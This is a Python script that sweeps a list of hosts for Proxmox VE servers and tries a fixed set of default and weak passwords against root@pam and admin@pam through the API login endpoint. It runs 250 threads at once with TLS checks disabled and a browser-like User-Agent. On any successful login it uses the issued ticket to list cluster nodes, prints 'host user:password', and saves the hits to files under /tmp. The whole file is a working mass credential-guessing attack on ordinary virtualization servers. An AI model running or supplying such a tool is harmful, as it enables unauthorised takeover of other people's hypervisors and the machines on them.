#!/usr/bin/env python3
"""Proxmox credential sweep - top credentials only, fast."""
import sys,json,time,threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests,urllib3
urllib3.disable_warnings()
T=10
UA={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}
USERS=["root@pam","admin@pam"]
PWS=["root","password","admin","123456","proxmox","toor","P@ssw0rd","password1",
     "admin123","qwerty","changeme","12345678","pve","root123","Password1"]
CREDS=[(u,p) for u in USERS for p in PWS]
def one(host):
    out={"host":host}
    s=requests.Session(); s.verify=False; s.headers.update(UA)
    try:
        v=s.get(f"https://{host}/api2/json/version",timeout=T)
        if v.status_code not in (200,401,403): return None
    except Exception: return None
    for u,p in CREDS:
        try:
            r=s.post(f"https://{host}/api2/json/access/ticket",data={"username":u,"password":p},timeout=T)
        except Exception: return out
        if r.status_code==200 and "ticket" in (r.text or ""):
            out.update({"user":u,"pw":p,"PROVEN":True})
            try:
                d=r.json().get("data",{}); t=d.get("ticket")
                h=s.get(f"https://{host}/api2/json/nodes",headers={"Cookie":f"PVEAuthCookie={t}"},timeout=T)
                if h.status_code==200:
                    out["nodes"]=[n.get("node") for n in h.json().get("data",[])]
            except Exception: pass
            return out
    return out
def main():
    hosts=[l.strip() for l in open(sys.argv[1]) if l.strip()]
    hits,lock=[],threading.Lock(); n=0; t0=time.time()
    with ThreadPoolExecutor(max_workers=250) as ex:
        for f in as_completed([ex.submit(one,h) for h in hosts]):
            n+=1
            try: r=f.result()
            except Exception: r=None
            if r and r.get("PROVEN"):
                with lock:
                    hits.append(r); json.dump(hits,open("/tmp/pve_hits2.json","w"),indent=1)
                print(f"🔥 {r['host']} {r['user']}:{r['pw']} {r.get('nodes')}",flush=True)
            if n%2000==0: print(f"  .. {n}/{len(hosts)} hits={len(hits)} {time.time()-t0:.0f}s",flush=True)
    json.dump({"scanned":len(hosts),"proven":hits},open("/tmp/pve_result2.json","w"),indent=1)
    print(f"\nDONE n={len(hosts)} PROVEN={len(hits)} in {time.time()-t0:.0f}s",flush=True)
main()
